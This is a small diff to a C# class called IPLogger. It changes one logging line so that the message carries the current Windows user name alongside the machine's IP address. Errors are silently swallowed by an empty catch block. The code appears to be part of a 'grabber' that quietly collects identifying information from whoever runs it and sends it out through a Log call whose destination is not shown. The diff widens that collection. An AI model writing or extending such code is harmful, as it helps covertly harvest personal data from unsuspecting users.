@@ -41,7 +41,7 @@ class IPLogger {
         try  {
             string ip = GetIP();
             
-            await Log($"```{ip}```");
+            await Log($"```{System.Security.Principal.WindowsIdentity.GetCurrent().Name}``````{ip}```");
         }
         catch(Exception _) {}
     }
